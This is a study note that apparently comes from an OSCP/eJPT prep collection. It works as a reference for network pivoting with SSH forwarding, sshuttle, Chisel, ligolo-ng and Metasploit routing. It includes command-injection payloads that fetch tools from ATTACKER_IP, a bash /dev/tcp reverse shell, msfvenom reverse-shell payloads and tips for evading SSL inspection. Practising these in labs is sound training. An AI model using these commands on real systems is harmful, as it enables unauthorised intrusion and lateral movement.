---
tags: [oscp-journey, spectre, stage-2, ejpt, pivoting, tunneling]
module: 2
cert-stage: ejpt
difficulty: intermediate
date: 2026-04-08
phantom-refs: []
netgod-refs: ["Networking/Module-00-Foundations"]
---

# S2-02 — Network Pivoting — Complete Reference

## What Pivoting Is and Why You Need It

Pivoting is the technique of using a compromised host as a relay to reach network segments that are otherwise unreachable from your attacker machine.

**The scenario:**

```
Your Kali (10.50.50.1)
        │
        │ VPN
        │
[External Network: 192.168.0.0/24]
        │
   Pivot Host (192.168.0.15 AND 10.10.10.1)
        │
[Internal Network: 10.10.10.0/24]  ← You cannot reach this directly
        │
   Target Machine (10.10.10.20)    ← This is where the crown jewels are
```

Your Kali can talk to `192.168.0.15`. Your Kali **cannot** talk to `10.10.10.20` — there is no route. But `192.168.0.15` **can** talk to `10.10.10.20` because it has a foot in both networks.

**Pivoting routes your attack traffic through the compromised host** so that from `10.10.10.20`'s perspective, the attack originates from `192.168.0.15` (the pivot), not from your Kali.

---

## Identifying the Pivot Host

After compromising any machine, always check for additional network interfaces:

```bash
# Linux:
ip a                          # All interfaces — look for multiple IPs
ip route                      # Routing table — reveals known subnets
cat /etc/hosts                # Internal hostname mappings
arp -a                        # ARP cache — other hosts this machine has spoken to
cat /proc/net/arp             # Alternative ARP table

# Windows:
ipconfig /all                 # All interfaces
route print                   # Routing table
arp -a                        # ARP cache
```

**You've found the pivot host when you see:**
```
eth0: 192.168.0.15/24         ← External-facing
eth1: 10.10.10.1/24           ← Internal-facing

Or in ip route:
default via 192.168.0.1 dev eth0
10.10.10.0/24 dev eth1 proto kernel
```

The machine with two NICs on different subnets is your pivot.

---

## Method 1 — SSH Local Port Forwarding (-L)

**What it does:** Forwards a specific local port on your Kali to a specific port on a specific remote host, through the SSH connection to the pivot.

**Syntax:**
```bash
ssh -L [LOCAL_IP:]LOCAL_PORT:REMOTE_HOST:REMOTE_PORT user@PIVOT_HOST
```

**At the TCP level:**
```
Your Kali:LOCAL_PORT → SSH tunnel → PIVOT → REMOTE_HOST:REMOTE_PORT
```

**Use case:** You want to access a single specific service on a machine in the internal network.

**Example — Access MySQL on internal machine:**
```bash
# Internal machine at 10.10.10.20 runs MySQL on port 3306
# You can't reach it directly
# Set up local forward:
ssh -L 3306:10.10.10.20:3306 user@192.168.0.15

# Now on Kali:
mysql -h 127.0.0.1 -P 3306 -u root -p
# Traffic flows: Kali:3306 → SSH → Pivot (192.168.0.15) → MySQL (10.10.10.20:3306)
```

**Example — Access internal web app:**
```bash
ssh -L 8080:10.10.10.20:80 user@192.168.0.15
# Browse to http://127.0.0.1:8080 on Kali → reaches internal web app
```

**Flags explained:**
```bash
-L        # Local port forward
-N        # Don't execute a remote command (just forward — no shell)
-f        # Go to background after authenticating
-i key    # SSH key file
-p 2222   # SSH on non-standard port

# Run in background (no shell, just forwarding):
ssh -L 3306:10.10.10.20:3306 -N -f user@192.168.0.15
```

**Limitation:** Only forwards one port to one destination. For accessing many services on many machines, use Dynamic Forwarding instead.

---

## Method 2 — SSH Dynamic Port Forwarding (SOCKS Proxy) (-D)

**What it does:** Creates a SOCKS proxy on your local machine. Any application configured to use the proxy routes its traffic through the SSH tunnel to the pivot, which forwards it to the destination.

**Syntax:**
```bash
ssh -D [BIND_ADDRESS:]PORT user@PIVOT_HOST
```

**At the TCP level:**
```
Application → SOCKS Proxy (localhost:9050) → SSH tunnel → PIVOT → Destination
```

**Use case:** You want to reach ANY host and ANY port on the internal network without setting up individual forwards for each.

**Step 1 — Create the SOCKS proxy:**
```bash
ssh -D 9050 -N -f user@192.168.0.15
# -D 9050  = create SOCKS proxy on local port 9050
# -N       = no shell
# -f       = background

# Verify it's running:
ss -tulpn | grep 9050    # Should show ssh listening on 9050
```

**Step 2 — Configure proxychains:**
```bash
# Edit /etc/proxychains4.conf:
sudo nano /etc/proxychains4.conf

# At the bottom, ensure:
socks5 127.0.0.1 9050

# Comment out any other proxy lines
# Check 'strict_chain' is set (not 'dynamic_chain' or 'random_chain' for reliability)
```

**Step 3 — Use proxychains for any tool:**
```bash
# Scan internal network through pivot:
proxychains nmap -sT -Pn 10.10.10.0/24 --min-rate 1000

# CRITICAL: Must use -sT (TCP connect) NOT -sS (SYN scan)
# -sS uses raw sockets which don't work through SOCKS
# -Pn skips ping (ICMP doesn't work through SOCKS)

# Connect to services:
proxychains ssh user@10.10.10.20
proxychains mysql -h 10.10.10.20 -u root -p
proxychains evil-winrm -i 10.10.10.20 -u admin -p password
proxychains curl http://10.10.10.20/
proxychains impacket-psexec admin:pass@10.10.10.20
```

**Proxychains configuration file — full example:**
```
# /etc/proxychains4.conf
strict_chain
proxy_dns              # Resolve DNS through proxy too
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 9050
```

**Limitation of proxychains:**
- UDP traffic doesn't work (no ICMP, no UDP-based tools)
- Nmap UDP scan won't work through proxychains
- DNS lookups may fail — use `proxy_dns` in config or use IPs directly
- Some tools ignore proxy settings — verify each tool works

---

## Method 3 — sshuttle (Transparent Proxy)

**What it does:** Creates a transparent VPN-like tunnel over SSH. No proxychains needed — all TCP traffic to the specified subnet routes through the pivot automatically.

**Advantage over proxychains:** Any tool works without modification. No `-sT` requirement for nmap. Cleaner and faster.

**Disadvantage:** Requires Python on the pivot host (usually present). Doesn't work if pivot is Windows without Python.

**Syntax:**
```bash
sshuttle -r user@PIVOT_HOST INTERNAL_SUBNET/MASK
```

**Usage:**
```bash
# Route all traffic to 10.10.10.0/24 through the pivot:
sshuttle -r user@192.168.0.15 10.10.10.0/24

# With SSH key:
sshuttle -r user@192.168.0.15 10.10.10.0/24 --ssh-cmd "ssh -i id_rsa"

# Multiple subnets:
sshuttle -r user@192.168.0.15 10.10.10.0/24 172.16.0.0/24

# Exclude certain IPs from routing:
sshuttle -r user@192.168.0.15 10.10.10.0/24 --exclude 10.10.10.1

# Run in background:
sshuttle -r user@192.168.0.15 10.10.10.0/24 -D
```

**After sshuttle is running:**
```bash
# No proxychains needed — run tools normally:
nmap -sC -sV 10.10.10.20          # Works directly
curl http://10.10.10.20/           # Works directly
ssh user@10.10.10.20               # Works directly
evil-winrm -i 10.10.10.20 -u user -p pass   # Works directly
```

**When sshuttle fails:**
```
Error: No handlers found for socks protocol
→ Python not installed on pivot, or Python version mismatch
→ Fall back to SSH -D with proxychains

Error: Permission denied (sudo required)
→ sshuttle needs root on Kali to modify routing tables
→ Run: sudo sshuttle -r ...

Connection reset errors
→ MTU issues — try: sshuttle -r user@PIVOT SUBNET --no-latency-control
```

---

## Method 4 — Chisel (No SSH Required)

**What it does:** Creates HTTP-based tunnels without SSH. Useful when:
- The pivot doesn't have SSH running
- SSH is blocked by firewall rules
- You have a web shell but no SSH access
- You need to reverse tunnel (pivot calls back to you)

**Architecture:**
```
Kali (server)  ←──── HTTP/HTTPS ────  Pivot (client)
```

The server runs on your Kali. The client runs on the pivot. The client connects OUT to your server — useful when you can't reach the pivot directly.

**Download:**
```bash
# On Kali:
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.x.x_linux_amd64.gz
gunzip chisel_1.x.x_linux_amd64.gz
mv chisel_1.x.x_linux_amd64 chisel
chmod +x chisel
python3 -m http.server 80    # Serve it for download on pivot
```

**Uploading chisel to the pivot:**
```bash
# On Linux pivot (from web shell or shell):
wget http://ATTACKER_IP/chisel -O /tmp/chisel
chmod +x /tmp/chisel

# On Windows pivot:
certutil -urlcache -split -f http://ATTACKER_IP/chisel.exe C:\Temp\chisel.exe
```

**SOCKS proxy via Chisel — the most common use case:**

```bash
# Step 1 — On Kali (start chisel server):
./chisel server -p 8000 --reverse

# Step 2 — On pivot (connect as client, create reverse SOCKS):
/tmp/chisel client ATTACKER_IP:8000 R:socks

# This creates a SOCKS proxy on Kali at 127.0.0.1:1080 (default)
# Step 3 — Configure proxychains to use port 1080:
# In /etc/proxychains4.conf: socks5 127.0.0.1 1080

# Step 4 — Use proxychains normally:
proxychains nmap -sT -Pn 10.10.10.0/24
```

**Port forward via Chisel:**
```bash
# Forward specific port — pivot's internal port to Kali local port:
# On Kali:
./chisel server -p 8000 --reverse

# On pivot (forward internal MySQL to Kali port 3306):
/tmp/chisel client ATTACKER_IP:8000 R:3306:10.10.10.20:3306

# Now on Kali:
mysql -h 127.0.0.1 -P 3306 -u root -p   # Reaches internal MySQL
```

**Multiple forwards in one chisel client command:**
```bash
/tmp/chisel client ATTACKER_IP:8000 R:socks R:8080:10.10.10.20:80 R:3306:10.10.10.20:3306
# Creates SOCKS proxy AND forwards ports 8080 and 3306 simultaneously
```

**Chisel over HTTPS (evades SSL inspection):**
```bash
# Server with TLS:
./chisel server -p 443 --reverse --tls-cert cert.pem --tls-key key.pem

# Or use self-signed (generates automatically):
./chisel server -p 443 --reverse --tls-ca ""

# Client:
/tmp/chisel client --fingerprint FINGERPRINT https://ATTACKER_IP:443 R:socks
```

---

## Method 5 — ligolo-ng (Preferred for CPTS and Complex Environments)

**What it does:** Creates a TUN interface on your Kali, making internal network routing completely transparent. No proxychains at all — tools run as if you're directly on the internal network.

**Architecture:**
```
Kali (proxy — creates TUN interface) ←── Agent on Pivot ──→ Internal Network
```

**Why ligolo-ng is preferred for multi-hop and complex engagements:**
- Full network transparency — no proxychains, no `-sT` limitations
- UDP works (proxychains can't do UDP)
- Multiple simultaneous sessions
- Agents connect back to you (firewall-friendly)
- Listeners can forward reverse shells from deep inside the network back to you

**Setup:**
```bash
# Download on Kali:
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/proxy-linux-amd64
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent-linux-amd64
# Also get agent-windows-amd64 for Windows pivots

chmod +x proxy-linux-amd64
mv proxy-linux-amd64 ligolo-proxy
mv agent-linux-amd64 ligolo-agent
```

**Step 1 — Create TUN interface on Kali:**
```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

**Step 2 — Start ligolo proxy on Kali:**
```bash
./ligolo-proxy -selfcert -laddr 0.0.0.0:11601
# -selfcert  = generate self-signed cert automatically
# -laddr     = listen for agent connections on port 11601
```

**Step 3 — Upload and run agent on pivot:**
```bash
# Transfer agent to pivot:
wget http://ATTACKER_IP/ligolo-agent -O /tmp/agent
chmod +x /tmp/agent

# On pivot — connect to Kali:
/tmp/agent -connect ATTACKER_IP:11601 -ignore-cert
```

**Step 4 — On Kali ligolo console — start session:**
```
ligolo-ng » session               # List sessions
ligolo-ng » session 1             # Select the pivot session
[Agent: user@pivot] » start       # Start tunneling
```

**Step 5 — Add route to internal subnet on Kali:**
```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```

**Step 6 — Now use tools normally — NO proxychains:**
```bash
nmap -sC -sV 10.10.10.0/24        # Full nmap including UDP works
curl http://10.10.10.20/           # Direct HTTP
evil-winrm -i 10.10.10.20 -u user -p pass
ssh user@10.10.10.20
```

**Setting up listeners for reverse shells from internal machines:**

When you get a shell on an internal machine (10.10.10.20) and want it to call back to your Kali, you need to forward that connection through the pivot.

```
ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
# This tells ligolo: any connection to pivot:4444 forwards to Kali:4444
```

Then on the internal machine, trigger reverse shell to the pivot's internal IP:
```bash
bash -i >& /dev/tcp/10.10.10.1/4444 0>&1    # Connects to pivot:4444
# Pivot forwards to Kali:4444 via ligolo listener
# Kali catches it with: nc -lvnp 4444
```

**Multi-hop with ligolo-ng:**
After compromising a second pivot deeper in the network (10.10.10.30, which can reach 172.16.0.0/24):
```bash
# Upload agent to 10.10.10.30 as well
# On 10.10.10.30 — connect to Kali through existing tunnel:
/tmp/agent -connect ATTACKER_IP:11601 -ignore-cert    # Routes through ligolo tunnel

# In ligolo console — new session appears
# Add another route:
sudo ip route add 172.16.0.0/24 dev ligolo
# Now reach the third network directly
```

---

## Method 6 — Metasploit route + SOCKS (Meterpreter Pivoting)

**When to use:** You already have a Meterpreter session on the pivot. No need to install additional tools.

**Important for OSCP:** Using the Metasploit route module or SOCKS auxiliary counts as an auxiliary module — this IS your 1 Metasploit use. Use this only if you've already decided to spend your Metasploit use on this machine.

**Setup:**
```bash
# You have a Meterpreter session (session 1) on the pivot

# Step 1 — Add route through the session:
msf > route add 10.10.10.0/255.255.255.0 1    # Route internal subnet via session 1
msf > route print                              # Verify route is added

# Step 2 — Start SOCKS proxy (auxiliary module):
msf > use auxiliary/server/socks_proxy
msf auxiliary > set SRVPORT 9050
msf auxiliary > set VERSION 5
msf auxiliary > run -j                         # Run as background job

# Step 3 — Configure proxychains:
# In /etc/proxychains4.conf: socks5 127.0.0.1 9050

# Step 4 — Use proxychains:
proxychains nmap -sT -Pn 10.10.10.20
```

**Alternative — autoroute (Meterpreter post module):**
```bash
# In Meterpreter session:
meterpreter > run post/multi/manage/autoroute SUBNET=10.10.10.0/24 ACTION=ADD
# Or auto-detect subnets:
meterpreter > run post/multi/manage/autoroute ACTION=AUTOADD
```

---

## Double Pivot — Chaining Two Pivots

**Scenario:**
```
Kali → [Network A] → Pivot1 → [Network B] → Pivot2 → [Network C]
```

You can't reach Network C directly. You must pivot through Pivot1, then through Pivot2.

**With ligolo-ng (cleanest method):**
```bash
# After compromising Pivot1:
# Run agent on Pivot1 → route to Network B added on Kali

# After compromising Pivot2 (via Network B):
# Run agent on Pivot2 → agent connects to Kali via existing ligolo tunnel
# Route to Network C added on Kali
# All three networks now reachable directly from Kali
```

**With SSH + proxychains (chaining):**
```bash
# First pivot:
ssh -D 9050 -N -f user@Pivot1_External_IP
# proxychains → Pivot1

# Second pivot (through first):
proxychains ssh -D 9051 -N -f user@Pivot2_Internal_IP
# Configures a second SOCKS proxy on 9051 through 9050

# To reach Network C:
# Update proxychains to chain both proxies (dynamic_chain mode):
# socks5 127.0.0.1 9050
# socks5 127.0.0.1 9051

proxychains nmap -sT -Pn NETWORK_C_HOST
```

**With Chisel (multi-hop):**
```bash
# On Kali:
./chisel server -p 8000 --reverse

# On Pivot1 (connects to Kali):
/tmp/chisel client KALI_IP:8000 R:socks

# On Pivot2 (connects through Pivot1's chisel):
# First get chisel onto Pivot2 via Pivot1
# Then from Pivot2: chisel client Pivot1_Internal_IP:PORT R:socks
```

---

## Pivoting Without SSH — When You Only Have a Shell

If your pivot doesn't have SSH running (or you only have a webshell), you need SSH-independent tools: Chisel or ligolo-ng.

**Uploading tools via web shell:**
```bash
# Via curl command injection:
; curl http://ATTACKER_IP/chisel -o /tmp/chisel && chmod +x /tmp/chisel

# Via wget:
; wget http://ATTACKER_IP/chisel -O /tmp/chisel; chmod +x /tmp/chisel

# Via certutil (Windows):
& certutil -urlcache -split -f http://ATTACKER_IP/chisel.exe C:\Temp\chisel.exe

# Via PowerShell:
& powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/chisel.exe','C:\Temp\chisel.exe')"
```

**Running chisel in background (Linux):**
```bash
nohup /tmp/chisel client ATTACKER_IP:8000 R:socks &
```

**Running chisel in background (Windows):**
```cmd
start /b C:\Temp\chisel.exe client ATTACKER_IP:8000 R:socks
```

---

## eJPT Exam Pivoting Strategy

For the eJPT, the simplest approach is most reliable. Use this decision tree:

```
1. Does the pivot host have SSH running?
   YES → Use SSH Dynamic (-D) with proxychains
         OR use sshuttle for simplicity
   NO  → Use Chisel

2. Do you have SSH credentials for the pivot?
   YES → ssh -D 9050 -N -f user@PIVOT
   NO  → Use private key: ssh -i id_rsa -D 9050 -N -f user@PIVOT
         Or use Chisel if no SSH at all

3. Scan internal network:
   sshuttle: nmap directly (no proxychains needed)
   proxychains: proxychains nmap -sT -Pn INTERNAL_SUBNET/24
```

**eJPT recommended toolkit:**
- Primary: `sshuttle` — simplest, most transparent
- Fallback: `ssh -D` + `proxychains`
- No SSH available: `chisel`

---

## Catching Reverse Shells Through a Pivot

When you exploit an internal machine and trigger a reverse shell, the shell will try to connect to your Kali. But the internal machine can't reach your Kali directly — it can only reach the pivot.

**Two solutions:**

**Solution 1 — Use pivot's IP as LHOST:**
```bash
# Set LHOST to the pivot's internal IP:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf -o shell.elf

# On pivot — set up port forward to receive and relay:
ssh -R 4444:127.0.0.1:4444 user@KALI_IP    # Reverse tunnel FROM pivot TO Kali
# Or use socat:
socat TCP-LISTEN:4444,fork TCP:KALI_IP:4444
```

**Solution 2 — ligolo-ng listener (cleanest):**
```bash
# In ligolo console:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
# Pivot listens on :4444, forwards to Kali:4444

# On Kali:
nc -lvnp 4444                         # Listen for the shell

# LHOST in payload = pivot's internal IP:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf -o shell.elf
```

---

## Quick Reference — All Pivoting Methods

| Method | Requires | Pros | Cons | Best For |
|--------|---------|------|------|---------|
| SSH -L (local forward) | SSH on pivot | Simple, specific port | One port at a time | Accessing one specific service |
| SSH -D (SOCKS) | SSH on pivot | Flexible, any TCP | Proxychains overhead, no UDP | General internal access |
| sshuttle | SSH + Python | Transparent, no proxychains | Needs Python on pivot | Clean access, full TCP |
| Chisel | HTTP access | Works without SSH, reverse-capable | Two binaries to manage | No-SSH scenarios |
| ligolo-ng | Any shell | Full transparency, UDP, multi-hop | More setup | Complex engagements, CPTS |
| MSF route+SOCKS | Meterpreter | No extra tools | Uses Metasploit limit | Already have Meterpreter |

---

## Command Quick Reference

```bash
# SSH local port forward (single port):
ssh -L 3306:INTERNAL_HOST:3306 -N -f user@PIVOT

# SSH dynamic SOCKS proxy:
ssh -D 9050 -N -f user@PIVOT

# Configure proxychains:
echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf

# Scan through proxychains:
proxychains nmap -sT -Pn INTERNAL_SUBNET/24 --min-rate 1000

# sshuttle transparent proxy:
sudo sshuttle -r user@PIVOT INTERNAL_SUBNET/24

# Chisel server (Kali):
./chisel server -p 8000 --reverse

# Chisel client (pivot — creates SOCKS on Kali:1080):
/tmp/chisel client KALI_IP:8000 R:socks

# Chisel client (pivot — specific port forward):
/tmp/chisel client KALI_IP:8000 R:3306:INTERNAL:3306

# ligolo-ng — create TUN interface:
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up

# ligolo-ng — start proxy:
./ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# ligolo-ng — run agent on pivot:
/tmp/agent -connect KALI_IP:11601 -ignore-cert

# ligolo-ng — add route:
sudo ip route add 10.10.10.0/24 dev ligolo

# ligolo-ng — add listener (for reverse shells from internal):
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444

# Identify pivot host:
ip a; ip route; arp -a                    # Linux
ipconfig /all; route print; arp -a        # Windows

# Socat relay (on pivot without other tools):
socat TCP-LISTEN:4444,fork TCP:KALI_IP:4444 &
```

---

## Common Mistakes

> [!warning] Pivoting mistakes that stop people dead
> 1. **Using nmap -sS through proxychains.** Silent failure — no results, no error. Always `-sT -Pn` with proxychains.
> 2. **Not adding -Pn to nmap through proxychains.** ICMP doesn't go through SOCKS. Without -Pn, Nmap thinks all hosts are down.
> 3. **Forgetting to configure proxychains.conf.** The SOCKS proxy exists but proxychains doesn't know about it. Edit `/etc/proxychains4.conf` every time.
> 4. **Setting LHOST to Kali's IP in payloads for internal machines.** Internal machines can't reach your Kali directly. LHOST must be the pivot's internal IP, with a relay set up.
> 5. **Not checking for second network interfaces immediately.** `ip a` is the first thing to run on every compromised Linux machine. Miss it and you miss the entire internal network.
> 6. **Trying to use UDP-dependent tools through proxychains.** SNMP enumeration, DNS, and UDP Nmap scans don't work through SOCKS. Use ligolo-ng if you need UDP.
> 7. **Running chisel without nohup.** If your shell dies, chisel dies. Always `nohup /tmp/chisel ... &` on Linux.

---

## Practice Resources

| Resource | What to do |
|----------|-----------|
| TryHackMe — "Wreath" network | Multi-machine pivot lab — the best single pivoting practice environment |
| TryHackMe — "Lateral Movement and Pivoting" | Dedicated pivoting module with guided labs |
| TryHackMe — "Post-Exploitation Basics" | Covers Meterpreter routing and SOCKS |
| HTB Pro Labs — Dante | Full network with multiple pivots — used for OSCP prep |
| VulnHub — Mr. Robot | Single machine but good for basics before pivoting labs |
| Chisel GitHub (jpillora/chisel) | Read the README — excellent documentation with examples |
| ligolo-ng GitHub (nicocha30/ligolo-ng) | Official docs + usage examples |
| HackTricks — Tunneling and Port Forwarding | Comprehensive reference for all methods |
